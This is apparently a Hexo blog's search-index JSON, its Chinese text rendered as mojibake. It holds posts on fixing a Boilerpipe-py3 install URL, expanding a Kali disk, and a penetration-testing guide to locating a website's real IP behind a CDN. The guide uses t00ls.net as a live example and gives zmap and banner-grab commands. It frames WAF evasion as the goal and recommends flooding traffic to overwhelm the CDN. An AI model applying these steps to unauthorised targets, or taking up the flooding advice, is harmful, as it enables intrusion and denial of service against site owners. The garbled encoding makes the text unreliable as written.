{"meta":{"title":"å±±åŸå†°è”æ","subtitle":"","description":"","author":"å±±åŸå†°è”æ","url":"http://blog.ioimp.top","root":"/"},"pages":[{"title":"404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º","date":"2023-08-03T12:38:08.372Z","updated":"2023-08-03T12:38:08.372Z","comments":false,"path":"/404.html","permalink":"http://blog.ioimp.top/404.html","excerpt":"","text":""},{"title":"å…³äº","date":"2023-08-03T12:38:08.375Z","updated":"2023-08-03T12:38:08.375Z","comments":false,"path":"about/index.html","permalink":"http://blog.ioimp.top/about/index.html","excerpt":"","text":"ä¸ªäººè¯¦ç»†ä»‹ç»"},{"title":"ä¹¦å•","date":"2023-08-03T12:38:08.376Z","updated":"2023-08-03T12:38:08.376Z","comments":false,"path":"books/index.html","permalink":"http://blog.ioimp.top/books/index.html","excerpt":"","text":""},{"title":"åˆ†ç±»","date":"2023-08-03T14:00:34.003Z","updated":"2023-08-03T14:00:34.003Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ioimp.top/categories/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2023-08-03T12:38:08.380Z","updated":"2023-08-03T12:38:08.380Z","comments":false,"path":"tags/index.html","permalink":"http://blog.ioimp.top/tags/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2023-08-03T12:38:08.378Z","updated":"2023-08-03T12:38:08.378Z","comments":true,"path":"links/index.html","permalink":"http://blog.ioimp.top/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-08-03T12:38:08.379Z","updated":"2023-08-03T12:38:08.379Z","comments":false,"path":"repository/index.html","permalink":"http://blog.ioimp.top/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"å°è¯•å®‰è£…Boilerpipe-py3æ—¶å‡ºç°404é”™è¯¯","slug":"å°è¯•å®‰è£…Boilerpipe-py3æ—¶å‡ºç°404é”™è¯¯","date":"2023-08-21T09:28:34.000Z","updated":"2023-08-21T09:31:59.404Z","comments":true,"path":"2023/08/21/å°è¯•å®‰è£…Boilerpipe-py3æ—¶å‡ºç°404é”™è¯¯/","link":"","permalink":"http://blog.ioimp.top/2023/08/21/%E5%B0%9D%E8%AF%95%E5%AE%89%E8%A3%85Boilerpipe-py3%E6%97%B6%E5%87%BA%E7%8E%B0404%E9%94%99%E8%AF%AF/","excerpt":"","text":"é—®é¢˜æå‡ºBoilerpipeæ˜¯ä¸€ä¸ªå¾ˆæ£’çš„æ¸…ç†ç½‘é¡µçš„Javaç¨‹åºï¼Œæˆ‘ä»¥å‰ä¹Ÿç”¨è¿‡å®ƒã€‚æˆ‘ä»Šå¤©æ³¨æ„åˆ°ï¼Œè®¸å¤šç”¨æˆ·æ— æ³•å®‰è£…PythonåŒ…è£…å™¨ç‰ˆæœ¬å¹¶å¾—åˆ°404å’Œå…¶ä»–é”™è¯¯ã€‚ 123456789101112131415161718192021C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0&gt;python setup.pyTraceback (most recent call last): File &quot;C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0\\setup.py&quot;, line 33, in &lt;module&gt; download_jars(datapath=DATAPATH) File &quot;C:\\Users\\COLIN\\Downloads\\boilerpipe-py3-1.2.0.0\\boilerpipe-py3-1.2.0.0\\setup.py&quot;, line 26, in download_jars urlretrieve(tgz_url, tgz_name) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 241, in urlretrieve with contextlib.closing(urlopen(url, data)) as fp: File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 216, in urlopen return opener.open(url, data, timeout) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 525, in open response = meth(req, response) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 634, in http_response response = self.parent.error( File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 563, in error return self._call_chain(*args) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 496, in _call_chain result = func(*args) File &quot;D:\\pythonProject\\python\\lib\\urllib\\request.py&quot;, line 643, in http_error_default raise HTTPError(req.full_url, code, msg, hdrs, fp)urllib.error.HTTPError: HTTP Error 404: Not Found é—®é¢˜è§£å†³æˆ‘ä¹Ÿé‡åˆ°äº†åŒæ ·çš„é—®é¢˜ï¼Œè¿™æ˜¯å› ä¸ºboilerpipeè¢«ç§»åŠ¨äº†ã€‚æˆ‘é€šè¿‡åœ¨installation tar.gzå†…çš„setup.pyä¸­å°†ä»¥ä¸‹ä»£ç è¡Œä»pypiæ›´æ”¹ä¸ºï¼š è€è¡Œï¼š 1tgz_url = &#x27;https://boilerpipe.googlecode.com/files/boilerpipe-&#123;0&#125;-bin.tar.gz&#x27;.format(version) æ–°è¡Œï¼š 1tgz_url = &#x27;https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/boilerpipe/boilerpipe-&#123;0&#125;-bin.tar.gz&#x27;.format(version) é‡æ–°å‹ç¼©æ•´ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨æ–°çš„å‹ç¼©ç›®å½•ä¸Šè¿è¡Œpip installã€‚","categories":[{"name":"å¼€å‘å¥‡é‡è®°","slug":"å¼€å‘å¥‡é‡è®°","permalink":"http://blog.ioimp.top/categories/%E5%BC%80%E5%8F%91%E5%A5%87%E9%81%87%E8%AE%B0/"}],"tags":[{"name":"Boilerpipe","slug":"Boilerpipe","permalink":"http://blog.ioimp.top/tags/Boilerpipe/"},{"name":"urlåœ°å€å˜è¿","slug":"urlåœ°å€å˜è¿","permalink":"http://blog.ioimp.top/tags/url%E5%9C%B0%E5%9D%80%E5%8F%98%E8%BF%81/"},{"name":"Stack Overflow","slug":"Stack-Overflow","permalink":"http://blog.ioimp.top/tags/Stack-Overflow/"}]},{"title":"kali Linuxç£ç›˜æ‰©å®¹","slug":"kali-Linuxç£ç›˜æ‰©å®¹","date":"2023-08-18T06:30:54.000Z","updated":"2023-08-18T06:38:03.468Z","comments":true,"path":"2023/08/18/kali-Linuxç£ç›˜æ‰©å®¹/","link":"","permalink":"http://blog.ioimp.top/2023/08/18/kali-Linux%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/","excerpt":"","text":"åœ¨å®‰è£…kaliæ—¶ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ä¼šç»™kaliåˆ†é…çš„ç©ºé—´æ¯”è¾ƒå°‘ã€‚åˆšå¼€å§‹è¿˜ç®—å¤Ÿç”¨ï¼Œä½†éšç€è½¯ä»¶çš„ä¸æ–­å®‰è£…å’Œç³»ç»Ÿçš„æ›´æ–°ã€‚è¿™æ—¶æˆ‘ä»¬ä¹‹å‰åˆ†é…çš„ç©ºé—´å°±æ˜¾å¾—ä¸è¶³äº†ã€‚é‚£è¯¥æ€æ ·æ‰©å®¹ä½ çš„ç£ç›˜å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹å½“å‰ç£ç›˜å æœ‰ç‡ ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼ df -h ç¼–è¾‘åˆ‡æ¢ä¸ºå±…ä¸­ å¯ä»¥çœ‹åˆ°ï¼Œç›®å‰æˆ‘ä»¬å·²ç»å æœ‰äº†58%ï¼Œ&#x2F;ä¾¿æ˜¯æˆ‘ä»¬çš„æ ¹ç›®å½•ã€‚ ğŸ˜˜å¢åŠ ç£ç›˜åœ¨vmwareè™šæ‹Ÿæœºä¸­ï¼Œé€‰æ‹©ç¼–è¾‘è™šæ‹Ÿæœºè®¾ç½®&gt;ç£ç›˜&gt;æ‰©å±• è®¾ç½®æœ€å¤§ç£ç›˜å¤§å°ï¼Œè¿™é‡Œæˆ‘çš„ç£ç›˜ä¹Ÿæ¯”è¾ƒæœ‰é™ï¼Œè®¾ç½®60G ç„¶åé‡æ–°å¯åŠ¨Kali linuxè™šæ‹Ÿæœºï¼Œä¼šå‘ç°ç£ç›˜çš„å®¹é‡å¹¶æ²¡æœ‰å¢åŠ ï¼Œè¿™é‡Œæ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰å¯¹å…¶è¿›è¡ŒæŒ‚è½½ã€‚æˆ‘ä»¬ä½¿ç”¨kaliä¸­çš„ç£ç›˜ç®¡ç†å·¥å…·è¿›è¡ŒæŒ‚è½½ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰15Gæ²¡æœ‰åˆ†é…çš„ç©ºé—´ã€‚è¿™ä¾¿æ˜¯åˆšæ‰æ‰©å®¹çš„éƒ¨åˆ†ã€‚ åœç”¨SWAPç©ºé—´ å…ˆå°†æœªåˆ†é…çš„15Gç»™åˆ°extendedä¸Šï¼Œé€‰æ‹©extendedå³é”®è°ƒæ•´å¤§å°ã€‚å‘å³æ‹–åˆ°å¯ä»¥è°ƒæ•´å¤§å°ã€‚ ç„¶åç§»åŠ¨linux-swapçš„ä½ç½® è¿™é‡Œæ³¨æ„æ˜¯ç‚¹å‡»ç™½è‰²çš„éƒ¨åˆ†ï¼Œå‘å³ç§»åŠ¨åˆ°æœ€åã€‚ ç‚¹å‡»è°ƒæ•´å¤§å°ç§»åŠ¨åç‚¹å‡»ç¡®å®š å†æ¬¡é€‰æ‹©extendedï¼Œè°ƒæ•´å¤§å°&#x2F;ç§»åŠ¨ï¼Œå‘å³æ‹–åŠ¨å°†é‡Œé¢çš„ç©ºé—´å…¨ç»™å‡ºå»ã€‚ å¯¹é½åˆ°éœ€è¦é€‰æ‹©æŸ±é¢ï¼Œç„¶åä¿å­˜ ç°åœ¨æˆ‘ä»¬æ¥è°ƒæ•´&#x2F;dev&#x2F;sda1åˆ†åŒºçš„å¤§å°ã€‚å‘å³æ‹–åŠ¨å°±è¡Œäº†ã€‚ æœ€åç‚¹å‡»ä¿å­˜ ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹ å·²ç»æˆåŠŸäº†ã€‚ åŸç†æˆ‘ä»¬æ˜¯ä¸èƒ½ç›´æ¥ç»™&#x2F;dev&#x2F;sda1åˆ†åŒºè°ƒæ•´å¤§å°çš„ã€‚åªèƒ½é€šè¿‡swapï¼ˆäº¤æ¢ç©ºé—´ï¼‰è¿›è¡Œä¸­è½¬ã€‚ç„¶åå†è°ƒæ•´&#x2F;dev&#x2F;sda1åˆ†åŒºçš„å¤§å°å°±è¡Œäº†ã€‚æœ€åä¸€å®šè¦è®°å¾—ä¿å­˜å“¦ï¼ https://www.bilibili.com/read/cv19163012 å‡ºå¤„ï¼šbilibili","categories":[{"name":"å®ç”¨æŠ€å·§","slug":"å®ç”¨æŠ€å·§","permalink":"http://blog.ioimp.top/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"ç£ç›˜åˆ†åŒº","slug":"ç£ç›˜åˆ†åŒº","permalink":"http://blog.ioimp.top/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"kali-linux","slug":"kali-linux","permalink":"http://blog.ioimp.top/tags/kali-linux/"}]},{"title":"éƒ¨ç½²CDNçš„ç½‘ç«™æ‰¾çœŸå®IP","slug":"éƒ¨ç½²CDNçš„ç½‘ç«™æ‰¾çœŸå®IP","date":"2023-08-15T14:40:26.000Z","updated":"2023-08-15T16:05:36.829Z","comments":true,"path":"2023/08/15/éƒ¨ç½²CDNçš„ç½‘ç«™æ‰¾çœŸå®IP/","link":"","permalink":"http://blog.ioimp.top/2023/08/15/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/","excerpt":"","text":"éƒ¨ç½²CDNçš„ç½‘ç«™æ‰¾çœŸå®IP1. æ¦‚è¿°ç›®å‰å¾ˆå¤šç½‘ç«™ä½¿ç”¨äº†cdnæœåŠ¡ï¼Œç”¨äº†æ­¤æœåŠ¡ å¯ä»¥éšè—æœåŠ¡å™¨çš„çœŸå®IPï¼ŒåŠ é€Ÿç½‘ç«™é™æ€æ–‡ä»¶çš„è®¿é—®ï¼Œè€Œä¸”ä½ è¯·æ±‚ç½‘ç«™æœåŠ¡æ—¶ï¼ŒcdnæœåŠ¡ä¼šæ ¹æ®ä½ æ‰€åœ¨çš„åœ°åŒºï¼Œé€‰æ‹©åˆé€‚çš„çº¿è·¯ç»™äºˆä½ è®¿é—®ï¼Œç”±æ­¤è¾¾ç½‘ç«™åŠ é€Ÿçš„æ•ˆæœï¼Œcdnä¸ä»…å¯ä»¥åŠ é€Ÿç½‘ç«™è®¿é—®ï¼Œè¿˜å¯ä»¥æä¾›wafæœåŠ¡ï¼Œå¦‚é˜²æ­¢ccæ”»å‡»ï¼ŒSQLæ³¨å…¥æ‹¦æˆªç­‰å¤šç§åŠŸèƒ½ï¼Œå†è¯´ä½¿ç”¨cdnçš„æˆæœ¬ä¸å¤ªé«˜ï¼Œå¾ˆå¤šäº‘æœåŠ¡å™¨ä¹Ÿå…è´¹æä¾›æ­¤æœåŠ¡ã€‚åœ¨è¿›è¡Œé»‘ç›’æµ‹è¯•çš„æ—¶å€™ï¼Œå¾€å¾€æˆäº†æ‹¦è·¯çŸ³ï¼Œæ‰€ä»¥æŒæ¡cdnæ‰¾çœŸå®ipæˆäº†ä¸å¾—ä¸æŒæ¡çš„ä¸€é¡¹æŠ€æœ¯ã€‚ 2. åˆ¤æ–­æ˜¯å¦CDNping åŸŸå ä½¿ç”¨è¶…çº§ping http://ping.chinaz.com/ http://ping.aizhan.com/ https://www.17ce.com/ http://ping.chinaz.com/www.t00ls.net ä¸åŒçš„åœ°åŒºè®¿é—®æœ‰ç€ä¸åŒçš„IPï¼Œè¿™æ ·å°±ç¡®å®šäº†è¯¥åŸŸåä½¿ç”¨äº†cdnäº†ã€‚ 3. æ‰¾çœŸå®IPçš„æ–¹æ³•é›†åˆæ‰¾åˆ°çœŸå®IPå¯ä»¥ç»§ç»­æ—ç«™æ£€æµ‹ï¼Œæ‰¾å…¶ä»–ç«™ç‚¹è¿›è¡Œçªç ´ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡cdnè¿›è¡Œè®¿é—®ï¼Œä»è€Œç»•è¿‡wafé’ˆå¯¹æ”»å‡»è¯­å¥çš„æ‹¦æˆª å‘ç°æœ‰æ”»å‡»è¯­å¥å°±ä¼šå¯¹æ”»å‡»çš„IPå°å µã€‚ 3.1. dnså†å²ç»‘å®šè®°å½•é€šè¿‡ä»¥ä¸‹è¿™äº›ç½‘ç«™å¯ä»¥è®¿é—®dnsçš„è§£æï¼Œæœ‰å¯èƒ½å­˜åœ¨æœªæœ‰ç»‘cdnä¹‹å‰çš„è®°å½•ã€‚ https://dnsdb.io/zh-cn/ ###DNSæŸ¥è¯¢ https://x.threatbook.cn/ ###å¾®æ­¥åœ¨çº¿ http://viewdns.info/ ###DNSã€IPç­‰æŸ¥è¯¢ https://tools.ipip.net/cdn.php ###CDNæŸ¥è¯¢IP https://sitereport.netcraft.com/?url=åŸŸå æŸ¥è¯¢WWW.T00Ls.netçš„å†å²è®°å½• https://site.ip138.com/www.t00ls.net/ 3.2. å­åŸŸåè§£æé€šè¿‡å­åŸŸåçš„è§£ææŒ‡å‘ ä¹Ÿæœ‰å¯èƒ½æŒ‡å‘ç›®æ ‡çš„åŒä¸€ä¸ªIPä¸Šã€‚ ä½¿ç”¨å·¥å…·å¯¹å…¶å­åŸŸåè¿›è¡Œç©·ä¸¾ åœ¨çº¿å­åŸŸåæŸ¥è¯¢ https://securitytrails.com/list/apex_domain/t00ls.net http://tool.chinaz.com/subdomain/t00ls.net https://phpinfo.me/domain/ æ‰¾åˆ°å­åŸŸåç»§ç»­ç¡®è®¤å­åŸŸåæ²¡æœ‰cdnçš„æƒ…å†µä¸‹æ‰¹é‡è¿›è¡ŒåŸŸåè§£ææŸ¥è¯¢ï¼Œæœ‰cdnçš„æƒ…å†µç»§ç»­æŸ¥è¯¢å†å²ã€‚ åŸŸåæ‰¹é‡è§£æ http://tools.bugscaner.com/domain2ip.html 3.3. å›½å¤–dnsè·å–çœŸå®IPéƒ¨åˆ†cdnåªé’ˆå¯¹å›½å†…çš„ipè®¿é—®ï¼Œå¦‚æœå›½å¤–ipè®¿é—®åŸŸå å³å¯è·å–çœŸå®IP å…¨ä¸–ç•ŒDNSåœ°å€ï¼š http://www.ab173.com/dns/dns_world.php https://dnsdumpster.com/ https://dnshistory.org/ http://whoisrequest.com/history/ https://completedns.com/dns-history/ http://dnstrails.com/ https://who.is/domain-history/ http://research.domaintools.com/research/hosting-history/ http://site.ip138.com/ http://viewdns.info/iphistory/ https://dnsdb.io/zh-cn/ https://www.virustotal.com/ https://x.threatbook.cn/ http://viewdns.info/ http://www.17ce.com/ http://toolbar.netcraft.com/site_report?url= https://securitytrails.com/ https://tools.ipip.net/cdn.php 3.4. icoå›¾æ ‡é€šè¿‡ç©ºé—´æœç´¢æ‰¾çœŸå®iphttps://www.t00ls.net/favicon.ico ä¸‹è½½å›¾æ ‡ æ”¾åˆ°fofaè¯†åˆ« é€šè¿‡fofaæœå›¾æ ‡ é€šè¿‡è¿™æ ·æŸ¥è¯¢ å¿«é€Ÿå®šä½èµ„æº æŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ è¿™é‡Œæ²¡æœ‰å¼€æ”¾ é€šè¿‡zoomeyeæœå›¾æ ‡ æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ ç»‘å®šhostsè¿›è¡Œæµ‹è¯• è¿™åº”è¯¥æ˜¯çœŸå®ipäº†ã€‚ 3.5. fofaæœç´¢çœŸå®IPdomain&#x3D;â€t00ls.netâ€ 302ä¸€èˆ¬æ˜¯cdn 3.6. é€šè¿‡censysæ‰¾çœŸå®ipCensyså·¥å…·å°±èƒ½å®ç°å¯¹æ•´ä¸ªäº’è”ç½‘çš„æ‰«æï¼ŒCensysæ˜¯ä¸€æ¬¾ç”¨ä»¥æœç´¢è”ç½‘è®¾å¤‡ä¿¡æ¯çš„æ–°å‹æœç´¢å¼•æ“ï¼Œèƒ½å¤Ÿæ‰«ææ•´ä¸ªäº’è”ç½‘ï¼ŒCensysä¼šå°†äº’è”ç½‘æ‰€æœ‰çš„ipè¿›è¡Œæ‰«é¢å’Œè¿æ¥ï¼Œä»¥åŠè¯ä¹¦æ¢æµ‹ã€‚ è‹¥ç›®æ ‡ç«™ç‚¹æœ‰httpsè¯ä¹¦ï¼Œå¹¶ä¸”é»˜è®¤è™šæ‹Ÿä¸»æœºé…äº†httpsè¯ä¹¦ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰¾æ‰€æœ‰ç›®æ ‡ç«™ç‚¹æ˜¯è¯¥httpsè¯ä¹¦çš„ç«™ç‚¹ã€‚ é€šè¿‡åè®®æŸ¥è¯¢ https://censys.io/ipv4?q=((www.t00ls.net) AND protocols: â€œ443&#x2F;httpsâ€) AND tags.raw: â€œhttpsâ€&amp; 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:moonsec.com 3.7. 360æµ‹ç»˜ä¸­å¿ƒhttps://quake.360.cn 3.8. åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IPè¯ä¹¦é¢å‘æœºæ„(CA)å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ªSSL&#x2F;TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ï¼ŒSSL&#x2F;TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚å› æ­¤SSL&#x2F;TLSè¯ä¹¦æˆä¸ºäº†æ”»å‡»è€…çš„åˆ‡å…¥ç‚¹ã€‚ è·å–ç½‘ç«™SSLè¯ä¹¦çš„HASHå†ç»“åˆCensys åˆ©ç”¨Censysæœç´¢ç½‘ç«™çš„SSLè¯ä¹¦åŠHASHï¼Œåœ¨https://crt.shä¸ŠæŸ¥æ‰¾ç›®æ ‡ç½‘ç«™SSLè¯ä¹¦çš„HASH å†ç”¨Censysæœç´¢è¯¥HASHå³å¯å¾—åˆ°çœŸå®IPåœ°å€ SSLè¯ä¹¦æœç´¢å¼•æ“ï¼š https://censys.io/ipv4?q=b6bce7fb8f7723ea63c6d0419e7af1f780d6b6cb1b4c2240e657f029142e2aae https://censys.io/certificates?q=parsed.names%3A+t00ls.net+and+tags.raw%3A+trusted æ‰¾åˆ°hash è½¬æˆipv4 è¿›è¡Œæœç´¢ æ‰¾åˆ°ä¸¤ä¸ªIP ä¸¤ä¸ªip 222.186.129.100 118.184.255.28 æˆ–è€…æŠŠhashæ”¾è¿›ç½‘ç»œç©ºé—´æœç´¢ 7489210725011808154949879630532736653 æˆåŠŸæ‰¾åˆ°ç½‘ç»œIP æ¥ç€å°±æ˜¯åˆ¤æ–­ipæ˜¯å¦æ˜¯è¿™ä¸ªåŸŸåçš„äº†ã€‚ 3.9. é‚®ç®±è·å–çœŸå®IPç½‘ç«™åœ¨å‘ä¿¡çš„æ—¶å€™ï¼Œä¼šé™„å¸¦çœŸå®çš„IPåœ°å€ è¿›å…¥é‚®ç®± æŸ¥çœ‹æºæ–‡ä»¶å¤´éƒ¨ä¿¡æ¯ é€‰æ‹©from æ˜¯å¦çœŸå® è¿˜éœ€è¦ é‚®ç®±å‘é€æ˜¯å¦ä¸ç½‘ç«™åŒä¸€ä¸ªIPåœ°å€ã€‚ 3.10. ç½‘ç«™æ•æ„Ÿæ–‡ä»¶è·å–çœŸå®IP æ–‡ä»¶æ¢é’ˆ phpinfo ç½‘ç«™æºä»£ç  ä¿¡æ¯æ³„éœ² GitHubä¿¡æ¯æ³„éœ² jsæ–‡ä»¶ 3.11. F5 LTMè§£ç æ³•å½“æœåŠ¡å™¨ä½¿ç”¨F5 LTMåšè´Ÿè½½å‡è¡¡æ—¶ï¼Œé€šè¿‡å¯¹set-cookieå…³é”®å­—çš„è§£ç çœŸå®ipä¹Ÿå¯è¢«è·å–ï¼Œ ä¾‹å¦‚ï¼šSet-Cookie: BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000ï¼Œå…ˆæŠŠç¬¬ä¸€å° èŠ‚çš„åè¿›åˆ¶æ•°å³487098378å–å‡ºæ¥ï¼Œç„¶åå°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶æ•°1d08880aï¼Œæ¥ç€ä»åè‡³å‰ï¼Œ ä»¥æ­¤å–å››ä½æ•°å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯0a.88.08.1dï¼Œæœ€åä¾æ¬¡æŠŠä»–ä»¬è½¬ä¸ºåè¿›åˆ¶æ•°10.136.8.29ï¼Œä¹Ÿå°± æ˜¯æœ€åçš„çœŸå®ipã€‚ rverpool-cas01&#x3D;3255675072.20480.0000; path&#x3D;&#x2F; 3255675072 è½¬åå…­è¿›åˆ¶ c20da8c0 ä»å³å‘å·¦å– c0a80dc2 è½¬10è¿›åˆ¶ 192 168 13 194 3.12. APPè·å–çœŸå®IPå¦‚æœç½‘ç«™æœ‰appï¼Œä½¿ç”¨Fiddleræˆ–BurpSuiteæŠ“å–æ•°æ®åŒ… å¯èƒ½è·å–çœŸå®IP æ¨¡æ‹Ÿå™¨ mimiæ¨¡æ‹Ÿå™¨æŠ“åŒ… 3.13. å°ç¨‹åºè·å–çœŸå®IP3.14. é…ç½®ä¸å½“è·å–çœŸå®IPåœ¨é…ç½®CDNçš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šåŸŸåã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œæœ‰æ—¶å€™å°å°çš„é…ç½®ç»†èŠ‚å°±å®¹æ˜“å¯¼è‡´CDNé˜²æŠ¤è¢«ç»•è¿‡ã€‚ æ¡ˆä¾‹1ï¼šä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è®¿é—®ï¼Œæˆ‘ä»¬å¸¸å¸¸å°†test.com å’Œ test.com è§£æåˆ°åŒä¸€ä¸ªç«™ç‚¹ï¼Œè€ŒCDNåªé…ç½®äº†www.test.comï¼Œé€šè¿‡è®¿é—®test.comï¼Œå°±å¯ä»¥ç»•è¿‡ CDN äº†ã€‚ æ¡ˆä¾‹2ï¼šç«™ç‚¹åŒæ—¶æ”¯æŒhttpå’Œhttpsè®¿é—®ï¼ŒCDNåªé…ç½® httpsåè®®ï¼Œé‚£ä¹ˆè¿™æ—¶è®¿é—®httpå°±å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚ 3.15. bannerè·å–ç›®æ ‡ç«™ç‚¹çš„bannerï¼Œåœ¨å…¨ç½‘æœç´¢å¼•æ“æœç´¢ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨AQUATONEï¼Œåœ¨Shodanä¸Šæœç´¢ç›¸åŒæŒ‡çº¹ç«™ç‚¹ã€‚ å¯ä»¥é€šè¿‡äº’è”ç½‘ç»œä¿¡æ¯ä¸­å¿ƒçš„IPæ•°æ®ï¼Œç­›é€‰ç›®æ ‡åœ°åŒºIPï¼Œéå†WebæœåŠ¡çš„bannerç”¨æ¥å¯¹æ¯”CDNç«™çš„bannerï¼Œå¯ä»¥ç¡®å®šæºIPã€‚ æ¬§æ´²ï¼š http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest åŒ—ç¾ï¼š https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest äºšæ´²ï¼š ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest éæ´²ï¼š ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest æ‹‰ç¾ï¼š ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest è·å–CNçš„IP http://www.ipdeny.com/ipblocks/data/countries/cn.zone ä¾‹å¦‚ï¼š æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨ IP æ®µåï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæš´åŠ›åŒ¹é… ï¼Œä½¿ç”¨zmapã€masscan æ‰«æ HTTP bannerï¼Œç„¶ååŒ¹é…åˆ°ç›®æ ‡åŸŸåçš„ç›¸åŒ banner zmap -p 80 -w bbs.txt -o 80.txt ä½¿ç”¨zmapçš„banner-grabå¯¹æ‰«æå‡ºæ¥80ç«¯å£å¼€æ”¾çš„ä¸»æœºè¿›è¡ŒbanneræŠ“å–ã€‚ cat &#x2F;root&#x2F;bbs.txt |.&#x2F;banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out æ ¹æ®ç½‘ç«™è¿”å›åŒ…ç‰¹å¾ï¼Œè¿›è¡Œç‰¹å¾è¿‡æ»¤ location: plugin.php?id&#x3D;info:index https://fofa.so/ title&#x3D;â€T00LS | ä½è°ƒæ±‚å‘å±• - æ½œå¿ƒä¹ å®‰å…¨ - T00ls.Netâ€ https://www.zoomeye.org/ title:â€T00LS | ä½è°ƒæ±‚å‘å±• -æ½œå¿ƒä¹ å®‰å…¨ -T00ls.Netâ€ https://quake.360.cn/ response:â€T00LS | ä½è°ƒæ±‚å‘å±• - æ½œå¿ƒä¹ å®‰å…¨ - T00ls.Netâ€ 1ã€ZMapå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘æ‰«æå·¥å…·ï¼Œèƒ½å¤Ÿåœ¨45åˆ†é’Ÿæ‰«éå…¨ç½‘ã€‚https://github.com/zmap/zmap 2ã€Masscanå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘ç«¯å£æ‰«æå™¨ï¼Œæœ€å¿«å¯ä»¥åœ¨å…­åˆ†é’Ÿå†…æ‰«éäº’è”ç½‘ã€‚ https://github.com/robertdavidgraham/masscan 3.16. é•¿æœŸå…³æ³¨åœ¨é•¿æœŸæ¸—é€çš„æ—¶å€™ï¼Œè®¾ç½®ç¨‹åºæ¯å¤©è®¿é—®ç½‘ç«™ï¼Œå¯èƒ½æœ‰æ–°çš„å‘ç°ã€‚æ¯å¤©é›¶ç‚¹ æˆ–è€…ä¸šåŠ¡éœ€æ±‚å¢å¤§ å®ƒä¼šæ¢ip æ¢æœåŠ¡å™¨çš„ã€‚ 3.17. æµé‡æ”»å‡»å‘åŒ…æœºå¯ä»¥ä¸€ä¸‹å­å‘é€å¾ˆå¤§çš„æµé‡ã€‚ è¿™ä¸ªæ–¹æ³•æ˜¯å¾ˆç¬¨ï¼Œä½†æ˜¯åœ¨ç‰¹å®šçš„ç›®æ ‡ä¸‹æ¸—é€ï¼Œå»ºè®®é‡‡ç”¨ã€‚ cdné™¤äº†èƒ½éšè—ipï¼Œå¯èƒ½è¿˜è€ƒè™‘åˆ°åˆ†é…æµé‡ï¼Œ ä¸è®¾é˜²çš„cdn é‡å¤§å°±ä¼šæŒ‚ï¼Œé«˜é˜²cdn è¦å¤§æµé‡è®¿é—®ã€‚ ç»å—ä¸ä½å¤§æµé‡å†²å‡»çš„æ—¶å€™å¯èƒ½ä¼šæ˜¾ç¤ºçœŸå®ipã€‚ ç«™é•¿-&gt;ä¸šåŠ¡ä¸æ­£å¸¸-&gt;cdnä¸ä½¿ç”¨-&gt;æ›´æ¢æœåŠ¡å™¨ã€‚ 3.18. è¢«åŠ¨è·å–è¢«åŠ¨è·å–å°±æ˜¯è®©æœåŠ¡å™¨æˆ–ç½‘ç«™ä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œä»è€Œè·å–æœåŠ¡å™¨çš„çœŸå®IP 